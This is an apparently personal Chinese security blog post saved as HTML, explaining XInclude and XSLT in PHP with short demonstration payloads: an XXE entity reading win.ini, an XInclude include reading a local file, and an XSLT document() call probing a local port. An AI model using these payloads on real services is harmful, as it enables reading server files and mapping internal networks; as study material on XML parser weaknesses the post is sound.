@@ -1,0 +1,860 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="参考文献：http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/ 环境12libxml:2.9.4win10 Xinclude用于合并XML文档的通用机制，通过在“主”文档中编写包含标记来自动包含其他文档或其他部分。生成的文档成为单个复合XML信息集。XInclude机制可用于合并XML文件或非XML文本文">
+<meta name="keywords" content="漏洞学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xinclude和xslt的利用">
+<meta property="og:url" content="https://cws6.github.io/2018/10/30/xinclude和xslt的利用/index.html">
+<meta property="og:site_name" content="cws6">
+<meta property="og:description" content="参考文献：http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/ 环境12libxml:2.9.4win10 Xinclude用于合并XML文档的通用机制，通过在“主”文档中编写包含标记来自动包含其他文档或其他部分。生成的文档成为单个复合XML信息集。XInclude机制可用于合并XML文件或非XML文本文">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-02f72a0f8c5e4172.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-05dab89074a8f746.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-c8b349d2accadefa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-c138a49063b17f16.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-03T13:41:40.787Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xinclude和xslt的利用">
+<meta name="twitter:description" content="参考文献：http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/ 环境12libxml:2.9.4win10 Xinclude用于合并XML文档的通用机制，通过在“主”文档中编写包含标记来自动包含其他文档或其他部分。生成的文档成为单个复合XML信息集。XInclude机制可用于合并XML文件或非XML文本文">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5035860-02f72a0f8c5e4172.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+
+
+
+  <link rel="canonical" href="https://cws6.github.io/2018/10/30/xinclude和xslt的利用/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>xinclude和xslt的利用 | cws6</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/cws6"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cws6</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">空巢老人</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cws6.github.io/2018/10/30/xinclude和xslt的利用/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cws6">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cws6">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xinclude和xslt的利用
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-10-30 18:45:38" itemprop="dateCreated datePublished" datetime="2018-10-30T18:45:38+08:00">2018-10-30</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-12-03 21:41:40" itemprop="dateModified" datetime="2018-12-03T21:41:40+08:00">2018-12-03</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>参考文献：<a href="http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/" target="_blank" rel="noopener">http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/</a></p>
+<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libxml:2.9.4</span><br><span class="line">win10</span><br></pre></td></tr></table></figure>
+<h4 id="Xinclude"><a href="#Xinclude" class="headerlink" title="Xinclude"></a>Xinclude</h4><p>用于合并<code>XML文档</code>的通用机制，通过在“主”文档中编写包含标记来自动包含其他文档或其他部分。生成的文档成为单个复合<code>XML信息集</code>。<code>XInclude</code>机制可用于合并<code>XML文件</code>或<code>非XML文本文件</code>中的内容。是xml标记语言中包含其他文件的方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;html  xmlns = &quot;http://www.w3.org/1999/xhtml&quot;</span><br><span class="line">      xmlns：xi =&quot;http://www.w3.org/2003/XInclude&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p><strong>xi:include 元素</strong><br><em>元素中的几个属性:</em></p>
+<ul>
+<li>href — 对要包括的文档的 URI 引用。</li>
+<li>parse — 它的值可以是“xml”或“text”，用于定义如何包括指定的文档（是作为 XML 还是作为纯文本）。默认值是“xml”。</li>
+<li>xpointer — 这是一个 XPointer，用于标识要包括的 XML 文档部分。如果作为文本包括 (parse=”text”)，将忽略该属性。</li>
+<li>encoding — 作为文本包括时，该属性提供所包括文档的编码提示信息。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;xi:include href=&quot;test.xml&quot; parse=&quot;text&quot;/&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><strong>xi:fallback元素</strong></p>
+<ul>
+<li>类似于try…except…，如果xinclude的内容出现问题，则显示fallback的内容<br>例如<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;xi:include href=&quot;test.xml&quot; parse=&quot;text&quot;/&gt;</span><br><span class="line">      &lt;xi:fallback&gt;Sorry, the file is unavailable&lt;xi:fallback&gt;</span><br><span class="line">&lt;/xi:include&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="传统的XXE文件读取"><a href="#传统的XXE文件读取" class="headerlink" title="传统的XXE文件读取"></a>传统的XXE文件读取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xml = &lt;&lt;&lt;EOD</span><br><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY f SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br><span class="line">EOD;</span><br><span class="line">$dom = new DOMDocument;</span><br><span class="line">// let&apos;s have a nice output</span><br><span class="line">$dom-&gt;preserveWhiteSpace = false;</span><br><span class="line">$dom-&gt;formatOutput = true;</span><br><span class="line">// load the XML string defined above</span><br><span class="line">$dom-&gt;loadXML($xml);</span><br><span class="line">// substitute xincludes</span><br><span class="line">echo $dom-&gt;saveXML();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-02f72a0f8c5e4172.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>PS：当前的xml解析已默认不支持外部实体引入了</p>
+<h4 id="xinclude文件读取"><a href="#xinclude文件读取" class="headerlink" title="xinclude文件读取"></a>xinclude文件读取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#payload</span><br><span class="line">$xml = &lt;&lt;&lt;EOD</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;</span><br><span class="line"> &lt;xi:include href=&quot;file:///d:/1.txt&quot; parse=&quot;text&quot;/&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line">EOD;</span><br><span class="line">$dom = new DOMDocument;</span><br><span class="line">$dom-&gt;preserveWhiteSpace = false;</span><br><span class="line">$dom-&gt;formatOutput = true;</span><br><span class="line">$dom-&gt;loadXML($xml);</span><br><span class="line">$dom-&gt;xinclude();</span><br><span class="line">echo $dom-&gt;saveXML();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>没有打开外部实体引用选项，却成功的读取<code>d:/1.txt</code>的内容<br><img src="https://upload-images.jianshu.io/upload_images/5035860-05dab89074a8f746.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>PS：<code>xinclude</code>无需使用<code>LIBXML_NOENT</code>选项去开启默认关闭的外部实体引用</p>
+<h4 id="xslt"><a href="#xslt" class="headerlink" title="xslt"></a>xslt</h4><p>XSL 指扩展样式表语言，而XSLT 指 XSL 转换，可以将<code>XML数据</code>转换为另外的<code>XML</code>或其它格式，如<code>HTML网页</code>，<code>纯文字</code><br><strong>利用php，将xml转换为html</strong></p>
+<ul>
+<li><p>test.xml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">	&lt;name&gt;Fruit&lt;/name&gt;</span><br><span class="line">	&lt;fname&gt;apple&lt;/fname&gt;</span><br><span class="line">	&lt;description&gt;red,delicious&lt;/description&gt;	</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>test.xsl</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;xsl:stylesheet version=&quot;1.0&quot;</span><br><span class="line">xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;</span><br><span class="line">&lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;xsl:for-each select=&quot;root&quot;&gt;</span><br><span class="line">  &lt;xsl:value-of select=&quot;name&quot; /&gt;&lt;br/&gt;</span><br><span class="line">  &lt;xsl:value-of select=&quot;fname&quot; /&gt;&lt;br/&gt;</span><br><span class="line">  &lt;xsl:value-of select=&quot;description&quot; /&gt;&lt;br/&gt;</span><br><span class="line">  &lt;/xsl:for-each&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>test.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$xslDoc = new DOMDocument();</span><br><span class="line">$xslDoc-&gt;load(&quot;test.xsl&quot;);</span><br><span class="line">$xmlDoc = new DOMDocument();</span><br><span class="line">$xmlDoc-&gt;load(&quot;test.xml&quot;);</span><br><span class="line">$proc = new XSLTProcessor();</span><br><span class="line">$proc-&gt;importStylesheet($xslDoc);</span><br><span class="line">echo $proc-&gt;transformToXML($xmlDoc);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-c8b349d2accadefa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h4 id="xsl端口探测"><a href="#xsl端口探测" class="headerlink" title="xsl端口探测"></a>xsl端口探测</h4><p>不需要开启外部实体引入，只需要使用<code>document()函数</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:for-each select=&quot;root&quot;&gt;</span><br><span class="line">  &lt;xsl:value-of select=&quot;name&quot; /&gt;&lt;br/&gt;</span><br><span class="line">  &lt;xsl:value-of select=&quot;fname&quot; /&gt;&lt;br/&gt;</span><br><span class="line">  &lt;xsl:value-of select=&quot;document(&apos;http://127.0.0.1:8080&apos;)&quot; /&gt;&lt;br/&gt;</span><br><span class="line">  &lt;/xsl:for-each&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-c138a49063b17f16.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>PS：当这个端口开启的时候，连这个端口开启的什么服务都知道</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+    <div>
+    
+       <div>
+
+    <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+
+</div>
+    
+    </div>
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞学习/" rel="tag"># 漏洞学习</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/22/复现jboss-CVE-2017-12149/" rel="next" title="复现jboss CVE-2017-12149">
+                <i class="fa fa-chevron-left"></i> 复现jboss CVE-2017-12149
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/05/条件竞争漏洞/" rel="prev" title="条件竞争漏洞">
+                条件竞争漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">cws6</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">59</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#环境"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Xinclude"><span class="nav-number">2.</span> <span class="nav-text">Xinclude</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#传统的XXE文件读取"><span class="nav-number">3.</span> <span class="nav-text">传统的XXE文件读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xinclude文件读取"><span class="nav-number">4.</span> <span class="nav-text">xinclude文件读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xslt"><span class="nav-number">5.</span> <span class="nav-text">xslt</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xsl端口探测"><span class="nav-number">6.</span> <span class="nav-text">xsl端口探测</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cws6</span>
+
+  
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+<!-- 
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+-->
+
+
+  <span class="post-meta-divider">|</span>
+
+
+<!-- 
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v6.6.0</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
